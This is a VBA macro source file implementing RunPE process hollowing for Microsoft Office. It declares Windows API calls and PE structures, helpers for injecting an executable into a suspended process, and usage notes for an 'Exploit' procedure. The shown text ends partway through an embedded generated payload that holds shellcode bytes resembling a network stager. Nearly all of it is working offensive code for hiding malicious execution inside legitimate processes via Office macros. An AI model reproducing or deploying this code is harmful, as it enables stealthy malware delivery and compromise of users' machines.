' --------------------------------------------------------------------------------
' Title: VBA RunPE
' Filename: RunPE.vba
' GitHub: https://github.com/itm4n/VBA-RunPE
' Date: 2019-12-14
' Author: Clement Labro (@itm4n)
' Description: A RunPE implementation in VBA with Windows API calls. It is
'   compatible with both 32 bits and 64 bits versions of Microsoft Office.
'   The 32 bits version of Office can only run 32 bits executables and the 64 bits
'   version can only run 64 bits executables.
' Usage: 1. In the 'Exploit' procedure at the end of the code, set the path of the
'               file you want to execute (with optional arguments)
'        2. Enable View > Immediate Window (Ctrl + G) (to check execution and error
'               logs)
'        3. Run the macro!
' Tested on: - Windows 7 Pro 64 bits + Office 2016 32 bits
'            - Windows 10 Pro 64 bits + Office 2016 64 bits
' Credit: @hasherezade - https://github.com/hasherezade/ (RunPE written in C++
'   with dynamic relocations)
' --------------------------------------------------------------------------------

Option Explicit

' ================================================================================
'                      ~~~ IMPORT WINDOWS API FUNCTIONS ~~~
' ================================================================================
#If Win64 Then
    Private Declare PtrSafe Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByVal sSource As LongPtr, ByVal lLength As Long)
    Private Declare PtrSafe Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As LongPtr, ByVal lpFilename As String, ByVal nSize As Long) As Long
    Private Declare PtrSafe Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
    Private Declare PtrSafe Function GetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, ByVal lpContext As LongPtr) As Long
    Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As LongPtr) As Long
    Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function VirtualFree Lib "KERNEL32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
    Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
    Private Declare PtrSafe Function SetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, ByVal lpContext As LongPtr) As Long
    Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
    Private Declare PtrSafe Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal uExitCode As Integer) As Long
#Else
    Private Declare Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As Long, ByVal sSource As Long, ByVal lLength As Long)
    Private Declare Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFilename As String, ByVal nSize As Long) As Long
    Private Declare Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
    Private Declare Function GetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
    Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As LongPtr) As Long
    Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare Function VirtualFree Lib "KERNEL32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
    Private Declare Function SetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
    Private Declare Function ResumeThread Lib "KERNEL32" (ByVal hThread As Long) As Long
    Private Declare Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As Long, ByVal uExitCode As Integer) As Long
#End If


' ================================================================================
'                           ~~~ WINDOWS STRUCTURES ~~~
' ================================================================================
' Constants used in structure definitions
Private Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
Private Const IMAGE_SIZEOF_SHORT_NAME = 8
Private Const MAXIMUM_SUPPORTED_EXTENSION = 512
Private Const SIZE_OF_80387_REGISTERS = 80

#If Win64 Then
    Private Type M128A
        Low As LongLong     'ULONGLONG Low;
        High As LongLong    'LONGLONG High;
    End Type
#End If

' https://www.nirsoft.net/kernel_struct/vista/IMAGE_DOS_HEADER.html
Private Type IMAGE_DOS_HEADER
     e_magic As Integer         'WORD e_magic;
     e_cblp As Integer          'WORD e_cblp;
     e_cp As Integer            'WORD e_cp;
     e_crlc As Integer          'WORD e_crlc;
     e_cparhdr As Integer       'WORD e_cparhdr;
     e_minalloc As Integer      'WORD e_minalloc;
     e_maxalloc As Integer      'WORD e_maxalloc;
     e_ss As Integer            'WORD e_ss;
     e_sp As Integer            'WORD e_sp;
     e_csum As Integer          'WORD e_csum;
     e_ip As Integer            'WORD e_ip;
     e_cs As Integer            'WORD e_cs;
     e_lfarlc As Integer        'WORD e_lfarlc;
     e_ovno As Integer          'WORD e_ovno;
     e_res(4 - 1) As Integer    'WORD e_res[4];
     e_oemid As Integer         'WORD e_oemid;
     e_oeminfo As Integer       'WORD e_oeminfo;
     e_res2(10 - 1) As Integer  'WORD e_res2[10];
     e_lfanew As Long           'LONG e_lfanew;
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680305(v=vs.85).aspx
Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long      'DWORD   VirtualAddress;
    Size As Long                'DWORD   Size;
End Type

' undocumented
Private Type IMAGE_BASE_RELOCATION
    VirtualAddress As Long        'DWORD   VirtualAddress
    SizeOfBlock As Long           'DWORD   SizeOfBlock
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680313(v=vs.85).aspx
Private Type IMAGE_FILE_HEADER
    Machine As Integer                  'WORD    Machine;
    NumberOfSections As Integer         'WORD    NumberOfSections;
    TimeDateStamp As Long               'DWORD   TimeDateStamp;
    PointerToSymbolTable As Long        'DWORD   PointerToSymbolTable;
    NumberOfSymbols As Long             'DWORD   NumberOfSymbols;
    SizeOfOptionalHeader As Integer     'WORD    SizeOfOptionalHeader;
    Characteristics As Integer          'WORD    Characteristics;
End Type

' https://msdn.microsoft.com/en-us/library/windows/desktop/ms680339(v=vs.85).aspx
Private Type IMAGE_OPTIONAL_HEADER
    #If Win64 Then
        Magic As Integer                        'WORD        Magic;
        MajorLinkerVersion As Byte              'BYTE        MajorLinkerVersion;
        MinorLinkerVersion As Byte              'BYTE        MinorLinkerVersion;
        SizeOfCode As Long                      'DWORD       SizeOfCode;
        SizeOfInitializedData As Long           'DWORD       SizeOfInitializedData;
        SizeOfUninitializedData As Long         'DWORD       SizeOfUninitializedData;
        AddressOfEntryPoint As Long             'DWORD       AddressOfEntryPoint;
        BaseOfCode As Long                      'DWORD       BaseOfCode;
        ImageBase As LongLong                   'ULONGLONG   ImageBase;
        SectionAlignment As Long                'DWORD       SectionAlignment;
        FileAlignment As Long                   'DWORD       FileAlignment;
        MajorOperatingSystemVersion As Integer  'WORD        MajorOperatingSystemVersion;
        MinorOperatingSystemVersion As Integer  'WORD        MinorOperatingSystemVersion;
        MajorImageVersion As Integer            'WORD        MajorImageVersion;
        MinorImageVersion As Integer            'WORD        MinorImageVersion;
        MajorSubsystemVersion As Integer        'WORD        MajorSubsystemVersion;
        MinorSubsystemVersion As Integer        'WORD        MinorSubsystemVersion;
        Win32VersionValue As Long               'DWORD       Win32VersionValue;
        SizeOfImage As Long                     'DWORD       SizeOfImage;
        SizeOfHeaders As Long                   'DWORD       SizeOfHeaders;
        CheckSum As Long                        'DWORD       CheckSum;
        Subsystem As Integer                    'WORD        Subsystem;
        DllCharacteristics As Integer           'WORD        DllCharacteristics;
        SizeOfStackReserve As LongLong          'ULONGLONG   SizeOfStackReserve;
        SizeOfStackCommit As LongLong           'ULONGLONG   SizeOfStackCommit;
        SizeOfHeapReserve As LongLong           'ULONGLONG   SizeOfHeapReserve;
        SizeOfHeapCommit As LongLong            'ULONGLONG   SizeOfHeapCommit;
        LoaderFlags As Long                     'DWORD       LoaderFlags;
        NumberOfRvaAndSizes As Long             'DWORD       NumberOfRvaAndSizes;
        DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY 'IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
    #Else
        Magic As Integer                        'WORD    Magic;
        MajorLinkerVersion As Byte              'BYTE    MajorLinkerVersion;
        MinorLinkerVersion As Byte              'BYTE    MinorLinkerVersion;
        SizeOfCode As Long                      'DWORD   SizeOfCode;
        SizeOfInitializedData As Long           'DWORD   SizeOfInitializedData;
        SizeOfUninitializedData As Long         'DWORD   SizeOfUninitializedData;
        AddressOfEntryPoint As Long             'DWORD   AddressOfEntryPoint;
        BaseOfCode As Long                      'DWORD   BaseOfCode;
        BaseOfData As Long                      'DWORD   BaseOfData;
        ImageBase As Long                       'DWORD   ImageBase;
        SectionAlignment As Long                'DWORD   SectionAlignment;
        FileAlignment As Long                   'DWORD   FileAlignment;
        MajorOperatingSystemVersion As Integer  'WORD    MajorOperatingSystemVersion;
        MinorOperatingSystemVersion As Integer  'WORD    MinorOperatingSystemVersion;
        MajorImageVersion As Integer            'WORD    MajorImageVersion;
        MinorImageVersion As Integer            'WORD    MinorImageVersion;
        MajorSubsystemVersion As Integer        'WORD    MajorSubsystemVersion;
        MinorSubsystemVersion As Integer        'WORD    MinorSubsystemVersion;
        Win32VersionValue As Long               'DWORD   Win32VersionValue;
        SizeOfImage As Long                     'DWORD   SizeOfImage;
        SizeOfHeaders As Long                   'DWORD   SizeOfHeaders;
        CheckSum As Long                        'DWORD   CheckSum;
        Subsystem As Integer                    'WORD    Subsystem;
        DllCharacteristics As Integer           'WORD    DllCharacteristics;
        SizeOfStackReserve As Long              'DWORD   SizeOfStackReserve;
        SizeOfStackCommit As Long               'DWORD   SizeOfStackCommit;
        SizeOfHeapReserve As Long               'DWORD   SizeOfHeapReserve;
        SizeOfHeapCommit As Long                'DWORD   SizeOfHeapCommit;
        LoaderFlags As Long                     'DWORD   LoaderFlags;
        NumberOfRvaAndSizes As Long             'DWORD   NumberOfRvaAndSizes;
        DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY 'IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
    #End If
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680336(v=vs.85).aspx
Private Type IMAGE_NT_HEADERS
    Signature As Long                         'DWORD Signature;
    FileHeader As IMAGE_FILE_HEADER           'IMAGE_FILE_HEADER FileHeader;
    OptionalHeader As IMAGE_OPTIONAL_HEADER   'IMAGE_OPTIONAL_HEADER OptionalHeader;
End Type

' https://www.nirsoft.net/kernel_struct/vista/IMAGE_SECTION_HEADER.html
Private Type IMAGE_SECTION_HEADER
    SecName(IMAGE_SIZEOF_SHORT_NAME - 1) As Byte 'UCHAR Name[IMAGE_SIZEOF_SHORT_NAME];
    Misc As Long                    'ULONG Misc;
    VirtualAddress As Long          'ULONG VirtualAddress;
    SizeOfRawData As Long           'ULONG SizeOfRawData;
    PointerToRawData As Long        'ULONG PointerToRawData;
    PointerToRelocations As Long    'ULONG PointerToRelocations;
    PointerToLinenumbers As Long    'ULONG PointerToLinenumbers;
    NumberOfRelocations As Integer  'WORD  NumberOfRelocations;
    NumberOfLinenumbers As Integer  'WORD  NumberOfLinenumbers;
    Characteristics As Long         'ULONG Characteristics;
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms684873(v=vs.85).aspx
Private Type PROCESS_INFORMATION
    hProcess As LongPtr     'HANDLE hProcess;
    hThread As LongPtr      'HANDLE hThread;
    dwProcessId As Long     'DWORD  dwProcessId;
    dwThreadId As Long      'DWORD  dwThreadId;
End Type

' https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx
Private Type STARTUPINFO
    cb As Long                  'DWORD  cb;
    lpReserved As String        'LPSTR  lpReserved;
    lpDesktop As String         'LPSTR  lpDesktop;
    lpTitle As String           'LPSTR  lpTitle;
    dwX As Long                 'DWORD  dwX;
    dwY As Long                 'DWORD  dwY;
    dwXSize As Long             'DWORD  dwXSize;
    dwYSize As Long             'DWORD  dwYSize;
    dwXCountChars As Long       'DWORD  dwXCountChars;
    dwYCountChars As Long       'DWORD  dwYCountChars;
    dwFillAttribute As Long     'DWORD  dwFillAttribute;
    dwFlags As Long             'DWORD  dwFlags;
    wShowWindow As Integer      'WORD   wShowWindow;
    cbReserved2 As Integer      'WORD   cbReserved2;
    lpReserved2 As LongPtr      'LPBYTE lpReserved2;
    hStdInput As LongPtr        'HANDLE hStdInput;
    hStdOutput As LongPtr       'HANDLE hStdOutput;
    hStdError As LongPtr        'HANDLE hStdError;
End Type

' https://www.nirsoft.net/kernel_struct/vista/FLOATING_SAVE_AREA.html
Private Type FLOATING_SAVE_AREA
    ControlWord As Long                                 'DWORD ControlWord;
    StatusWord As Long                                  'DWORD StatusWord;
    TagWord As Long                                     'DWORD TagWord;
    ErrorOffset As Long                                 'DWORD ErrorOffset;
    ErrorSelector As Long                               'DWORD ErrorSelector;
    DataOffset As Long                                  'DWORD DataOffset;
    DataSelector As Long                                'DWORD DataSelector;
    RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte   'BYTE  RegisterArea[SIZE_OF_80387_REGISTERS];
    Spare0 As Long                                      'DWORD Spare0;
End Type

' winnt.h
#If Win64 Then
    Private Type XMM_SAVE_AREA32
        ControlWord As Integer                  'WORD  ControlWord;
        StatusWord As Integer                   'WORD  StatusWord;
        TagWord As Byte                         'BYTE  TagWord;
        Reserved1 As Byte                       'BYTE  Reserved1;
        ErrorOpcode As Integer                  'WORD  ErrorOpcode;
        ErrorOffset As Long                     'DWORD ErrorOffset;
        ErrorSelector As Integer                'WORD  ErrorSelector;
        Reserved2 As Integer                    'WORD  Reserved2;
        DataOffset As Long                      'DWORD DataOffset;
        DataSelector As Integer                 'WORD  DataSelector;
        Reserved3 As Integer                    'WORD  Reserved3;
        MxCsr As Long                           'DWORD MxCsr;
        MxCsr_Mask As Long                      'DWORD MxCsr_Mask;
        FloatRegisters(8 - 1) As M128A          'M128A FloatRegisters[8];
        XmmRegisters(16 - 1) As M128A       'M128A XmmRegisters[16];
        Reserved4(96 - 1) As Byte           'BYTE  Reserved4[96];
End Type
#End If

Private Type CONTEXT
    #If Win64 Then
        ' Register parameter home addresses
        P1Home As LongLong                  'DWORD64 P1Home;
        P2Home As LongLong                  'DWORD64 P2Home;
        P3Home As LongLong                  'DWORD64 P3Home;
        P4Home As LongLong                  'DWORD64 P4Home;
        P5Home As LongLong                  'DWORD64 P5Home;
        P6Home As LongLong                  'DWORD64 P6Home;
        ' Control flags
        ContextFlags As Long                'DWORD ContextFlags;
        MxCsr As Long                       'DWORD MxCsr;
        ' Segment Registers and processor flags
        SegCs As Integer                    'WORD   SegCs;
        SegDs As Integer                    'WORD   SegDs;
        SegEs As Integer                    'WORD   SegEs;
        SegFs As Integer                    'WORD   SegFs;
        SegGs As Integer                    'WORD   SegGs;
        SegSs As Integer                    'WORD   SegSs;
        EFlags As Long                      'DWORD  EFlags;
        ' Debug registers
        Dr0 As LongLong                     'DWORD64 Dr0;
        Dr1 As LongLong                     'DWORD64 Dr1;
        Dr2 As LongLong                     'DWORD64 Dr2;
        Dr3 As LongLong                     'DWORD64 Dr3;
        Dr6 As LongLong                     'DWORD64 Dr6;
        Dr7 As LongLong                     'DWORD64 Dr7;
        ' Integer registers
        Rax As LongLong                     'DWORD64 Rax;
        Rcx As LongLong                     'DWORD64 Rcx;
        Rdx As LongLong                     'DWORD64 Rdx;
        Rbx As LongLong                     'DWORD64 Rbx;
        Rsp As LongLong                     'DWORD64 Rsp;
        Rbp As LongLong                     'DWORD64 Rbp;
        Rsi As LongLong                     'DWORD64 Rsi;
        Rdi As LongLong                     'DWORD64 Rdi;
        R8 As LongLong                      'DWORD64 R8;
        R9 As LongLong                      'DWORD64 R9;
        R10 As LongLong                     'DWORD64 R10;
        R11 As LongLong                     'DWORD64 R11;
        R12 As LongLong                     'DWORD64 R12;
        R13 As LongLong                     'DWORD64 R13;
        R14 As LongLong                     'DWORD64 R14;
        R15 As LongLong                     'DWORD64 R15;
        ' Program counter
        Rip As LongLong                     'DWORD64 Rip
        ' Floating point state
        FltSave As XMM_SAVE_AREA32          'XMM_SAVE_AREA32 FltSave;
        'Header(2 - 1) As M128A              'M128A Header[2];
        'Legacy(8 - 1) As M128A              'M128A Legacy[8];
        'Xmm0 As M128A                       'M128A Xmm0;
        'Xmm1 As M128A                       'M128A Xmm1;
        'Xmm2 As M128A                       'M128A Xmm2;
        'Xmm3 As M128A                       'M128A Xmm3;
        'Xmm4 As M128A                       'M128A Xmm4;
        'Xmm5 As M128A                       'M128A Xmm5;
        'Xmm6 As M128A                       'M128A Xmm6;
        'Xmm7 As M128A                       'M128A Xmm7;
        'Xmm8 As M128A                       'M128A Xmm8;
        'Xmm9 As M128A                       'M128A Xmm9;
        'Xmm10 As M128A                      'M128A Xmm10;
        'Xmm11 As M128A                      'M128A Xmm11;
        'Xmm12 As M128A                      'M128A Xmm12;
        'Xmm13 As M128A                      'M128A Xmm13;
        'Xmm14 As M128A                      'M128A Xmm14;
        'Xmm15 As M128A                      'M128A Xmm15;
        ' Vector registers
        VectorRegister(26 - 1) As M128A     'M128A   VectorRegister[26];
        VectorControl As LongLong           'DWORD64 VectorControl;
        ' Special debug control registers
        DebugControl As LongLong            'DWORD64 DebugControl;
        LastBranchToRip As LongLong         'DWORD64 LastBranchToRip;
        LastBranchFromRip As LongLong       'DWORD64 LastBranchFromRip;
        LastExceptionToRip As LongLong      'DWORD64 LastExceptionToRip;
        LastExceptionFromRip As LongLong    'DWORD64 LastExceptionFromRip;
    #Else
        ' https://msdn.microsoft.com/en-us/library/windows/desktop/ms679284(v=vs.85).aspx
        ContextFlags As Long                'DWORD ContextFlags;
        Dr0 As Long                         'DWORD Dr0;
        Dr1 As Long                         'DWORD Dr1;
        Dr2 As Long                         'DWORD Dr2;
        Dr3 As Long                         'DWORD Dr3;
        Dr6 As Long                         'DWORD Dr6;
        Dr7 As Long                         'DWORD Dr7;
        FloatSave As FLOATING_SAVE_AREA     'FLOATING_SAVE_AREA FloatSave;
        SegGs As Long                       'DWORD SegGs;
        SegFs As Long                       'DWORD SegFs;
        SegEs As Long                       'DWORD SegEs;
        SegDs As Long                       'DWORD SegDs;
        Edi As Long                         'DWORD Edi;
        Esi As Long                         'DWORD Esi;
        Ebx As Long                         'DWORD Ebx;
        Edx As Long                         'DWORD Edx;
        Ecx As Long                         'DWORD Ecx;
        Eax As Long                         'DWORD Eax;
        Ebp As Long                         'DWORD Ebp;
        Eip As Long                         'DWORD Eip;
        SegCs As Long                       'DWORD SegCs;  // MUST BE SANITIZED
        EFlags As Long                      'DWORD EFlags; // MUST BE SANITIZED
        Esp As Long                         'DWORD Esp;
        SegSs As Long                       'DWORD SegSs;
        ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As Byte 'BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];
    #End If
End Type


' ================================================================================
'                   ~~~ CONSTANTS USED IN WINDOWS API CALLS ~~~
' ================================================================================
Private Const MEM_COMMIT = &H1000
Private Const MEM_RESERVE = &H2000
Private Const PAGE_READWRITE = &H4
Private Const PAGE_EXECUTE_READWRITE = &H40
Private Const MAX_PATH = 260
Private Const CREATE_SUSPENDED = &H4

Private Const CONTEXT_AMD64 = &H100000
Private Const CONTEXT_I386 = &H10000
#If Win64 Then
    Private Const CONTEXT_ARCH = CONTEXT_AMD64
#Else
    Private Const CONTEXT_ARCH = CONTEXT_I386
#End If
Private Const CONTEXT_CONTROL = CONTEXT_ARCH Or &H1
Private Const CONTEXT_INTEGER = CONTEXT_ARCH Or &H2
Private Const CONTEXT_SEGMENTS = CONTEXT_ARCH Or &H4
Private Const CONTEXT_FLOATING_POINT = CONTEXT_ARCH Or &H8
Private Const CONTEXT_DEBUG_REGISTERS = CONTEXT_ARCH Or &H10
Private Const CONTEXT_EXTENDED_REGISTERS = CONTEXT_ARCH Or &H20
Private Const CONTEXT_FULL = CONTEXT_CONTROL Or CONTEXT_INTEGER Or CONTEXT_SEGMENTS


' ================================================================================
'                     ~~~ CONSTANTS USED IN THE MAIN SUB ~~~
' ================================================================================
Private Const VERBOSE = False                       ' Set to True for debugging
Private Const IMAGE_DOS_SIGNATURE = &H5A4D          ' 0x5A4D      // MZ
Private Const IMAGE_NT_SIGNATURE = &H4550           ' 0x00004550  // PE00
Private Const IMAGE_FILE_MACHINE_I386 = &H14C       ' 32 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
Private Const IMAGE_FILE_MACHINE_AMD64 = &H8664     ' 64 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
Private Const SIZEOF_IMAGE_DOS_HEADER = 64
Private Const SIZEOF_IMAGE_SECTION_HEADER = 40
Private Const SIZEOF_IMAGE_FILE_HEADER = 20
Private Const SIZEOF_IMAGE_DATA_DIRECTORY = 8
Private Const SIZEOF_IMAGE_BASE_RELOCATION = 8
Private Const SIZEOF_IMAGE_BASE_RELOCATION_ENTRY = 2
#If Win64 Then
    Private Const SIZEOF_IMAGE_NT_HEADERS = 264
    Private Const SIZEOF_ADDRESS = 8
#Else
    Private Const SIZEOF_IMAGE_NT_HEADERS = 248
    Private Const SIZEOF_ADDRESS = 4
#End If

' Data Directories
' |__ IMAGE_OPTIONAL_HEADER contains an array of 16 IMAGE_DATA_DIRECTORY structures
' |__ Each IMAGE_DATA_DIRECTORY structure as a "predefined role", as defined by these constants (in winnt.h)
Private Const IMAGE_DIRECTORY_ENTRY_EXPORT = 0       ' Export Directory
Private Const IMAGE_DIRECTORY_ENTRY_IMPORT = 1       ' Import Directory
Private Const IMAGE_DIRECTORY_ENTRY_RESOURCE = 2     ' Resource Directory
Private Const IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3    ' Exception Directory
Private Const IMAGE_DIRECTORY_ENTRY_SECURITY = 4     ' Security Directory
Private Const IMAGE_DIRECTORY_ENTRY_BASERELOC = 5    ' Base Relocation Table
Private Const IMAGE_DIRECTORY_ENTRY_DEBUG = 6        ' Debug Directory
Private Const IMAGE_DIRECTORY_ENTRY_COPYRIGHT = 7    ' Description String
Private Const IMAGE_DIRECTORY_ENTRY_GLOBALPTR = 8    ' Machine Value (MIPS GP)
Private Const IMAGE_DIRECTORY_ENTRY_TLS = 9          ' TLS Directory
Private Const IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10 ' Load Configuration Directory


' ================================================================================
'                                ~~~ HELPERS ~~~
' ================================================================================

' --------------------------------------------------------------------------------
' Method:    ByteArrayLength
' Desc:      Returns the length of a Byte array
' Arguments: baBytes - An array of Bytes
' Returns:   The size of the array as a Long
' --------------------------------------------------------------------------------
Public Function ByteArrayLength(baBytes() As Byte) As Long
    On Error Resume Next
    ByteArrayLength = UBound(baBytes) - LBound(baBytes) + 1
End Function

' --------------------------------------------------------------------------------
' Method:    ByteArrayToString
' Desc:      Converts an array of Bytes to a String
' Arguments: baBytes - An array of Bytes
' Returns:   The String representation of the Byte array
' --------------------------------------------------------------------------------
Private Function ByteArrayToString(baBytes() As Byte) As String
    Dim strRes As String: strRes = ""
    Dim iCount As Integer
    For iCount = 0 To ByteArrayLength(baBytes) - 1
        If baBytes(iCount) <> 0 Then
            strRes = strRes & Chr(baBytes(iCount))
        Else
            Exit For
        End If
    Next iCount
    ByteArrayToString = strRes
End Function

' --------------------------------------------------------------------------------
' Method:    FileToByteArray
' Desc:      Reads a file as a Byte array
' Arguments: strFilename - Fullname of the file as a String (ex:
'                'C:\Windows\System32\cmd.exe')
' Returns:   The content of the file as a Byte array
' --------------------------------------------------------------------------------
Private Function FileToByteArray(strFilename As String) As Byte()
    ' File content to String
    Dim strFileContent As String
    Dim iFile As Integer: iFile = FreeFile
    Open strFilename For Binary Access Read As #iFile
        strFileContent = Space(FileLen(strFilename))
        Get #iFile, , strFileContent
    Close #iFile
    
    ' String to Byte array
    Dim baFileContent() As Byte
    baFileContent = StrConv(strFileContent, vbFromUnicode)

    FileToByteArray = baFileContent
End Function

' --------------------------------------------------------------------------------
' Method:    StringToByteArray
' Desc:      Convert a String to a Byte array
' Arguments: strContent - Input String representing the PE
' Returns:   The content of the String as a Byte array
' --------------------------------------------------------------------------------
Private Function StringToByteArray(strContent As String) As Byte()
    Dim baContent() As Byte
    baContent = StrConv(strContent, vbFromUnicode)
    StringToByteArray = baContent
End Function

' --------------------------------------------------------------------------------
' Method:    A
' Desc:      Append a Char to a String.
' Arguments: strA - Input String. E.g.: "AAA"
'            bChar - Input Char as a Byte. E.g.: 66 or &H42
' Returns:   The concatenation of the String and the Char. E.g.: "AAAB"
' --------------------------------------------------------------------------------
Private Function A(strA As String, bChar As Byte) As String
    A = strA & Chr(bChar)
End Function

' --------------------------------------------------------------------------------
' Method:    B
' Desc:      Append a String to another String.
' Arguments: strA - Input String 1. E.g.: "AAAA"
'            strB - Input String 2. E.g.: "BBBB"
' Returns:   The concatenation of the two Strings. E.g.: "AAAABBBB"
' --------------------------------------------------------------------------------
Private Function B(strA As String, strB As String) As String
    B = strA + strB
End Function


' ================================================================================
'                                ~~~ EMBEDDED PE ~~~
' ================================================================================

' CODE GENERATED BY PE2VBA
' ===== BEGIN PE2VBA =====
Private Function PE0() As String
   Dim strPE As String

    strPE = ""
    strPE = B(A(B(A(A(A(B(strPE, "buf =  b"), 34), 34), 10), "buf += b"), 34), "\xfc\xe8\x8f\x00\x00\x00\x60\x")
    strPE = B(A(B(A(A(B(strPE, "31\xd2\x89\xe5\x64\x8b"), 34), 10), "buf += b"), 34), "\x52\x30\x8b\x52\")
    strPE = B(A(B(A(A(B(strPE, "x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a"), 34), 10), "buf += b"), 34), "\x26")
    strPE = A(A(B(strPE, "\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"), 34), 10)
    strPE = B(A(B(strPE, "buf += b"), 34), "\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52\x8b\")
    strPE = B(A(B(A(A(B(strPE, "x52\x10\x57"), 34), 10), "buf += b"), 34), "\x8b\x42\x3c\x01\xd0\x8b\x40")
    strPE = B(A(B(A(A(B(strPE, "\x78\x85\xc0\x74\x4c\x01"), 34), 10), "buf += b"), 34), "\xd0\x8b\x58\x2")
    strPE = B(A(B(A(A(B(strPE, "0\x01\xd3\x50\x8b\x48\x18\x85\xc9\x74"), 34), 10), "buf += b"), 34), "\x")
    strPE = B(strPE, "3c\x49\x31\xff\x8b\x34\x8b\x01\xd6\x31\xc0\xc1\xcf")
    strPE = B(A(B(A(A(strPE, 34), 10), "buf += b"), 34), "\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7")
    strPE = B(A(B(A(A(B(strPE, "d\xf8\x3b\x7d"), 34), 10), "buf += b"), 34), "\x24\x75\xe0\x58\x8b\x58\x")
    strPE = B(A(B(A(A(B(strPE, "24\x01\xd3\x66\x8b\x0c\x4b"), 34), 10), "buf += b"), 34), "\x8b\x58\x1c\")
    strPE = A(B(A(A(B(strPE, "x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"), 34), 10), "buf += b"), 34)
    strPE = B(strPE, "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x")
    strPE = B(A(B(A(A(B(strPE, "8b"), 34), 10), "buf += b"), 34), "\x12\xe9\x80\xff\xff\xff\x5d\x68\x6e\")
    strPE = B(A(B(A(A(B(strPE, "x65\x74\x00\x68"), 34), 10), "buf += b"), 34), "\x77\x69\x6e\x69\x54\x68")
    strPE = B(A(B(A(A(B(strPE, "\x4c\x77\x26\x07\xff\xd5\x31"), 34), 10), "buf += b"), 34), "\xdb\x53\x5")
